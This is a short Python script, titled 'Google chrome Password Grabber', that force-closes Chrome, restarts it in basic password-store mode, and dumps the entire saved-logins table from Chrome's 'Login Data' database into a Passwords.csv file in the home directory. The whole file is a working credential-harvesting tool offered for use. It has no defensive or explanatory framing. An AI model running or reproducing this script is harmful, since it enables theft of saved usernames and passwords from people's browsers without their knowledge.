#!/usr/bin/python3

import os
import time
import subprocess


def get_config_path():
    home_dir = os.path.expanduser('~')
    check_path = home_dir + "/.config/google-chrome/Default"
    if os.path.isdir(check_path):
        print('Path exists!')
        return check_path


def kill_chrome_processes():
    print('Closing chrome browser!')
    os.system('pkill chrome')


def open_chrome_with_basic_password_store():
    command = 'google-chrome --password-store=basic'
    p = subprocess.Popen(command, shell=True)
    print('Starting Chrome browser in basic store mode!')
    time.sleep(10)
    p.terminate()

def export_passwords_to_csv():
    print('Exporting passwords to Passwords.csv in home dir!')
    command = 'sqlite3 -header -csv -separator "," ~/.config/google-chrome/Default/Login\ Data "SELECT * FROM logins" > ~/Passwords.csv'
    os.system(command)


if __name__ == '__main__':
    print('Google chrome Password Grabber')

    os.system("export DBUS_SESSION_BUS_ADDRESS='unix:path=/run/user/1000/bus'")
    path = get_config_path()

    kill_chrome_processes()

    open_chrome_with_basic_password_store()

    time.sleep(5)
    # kill_chrome_processes()

    export_passwords_to_csv()
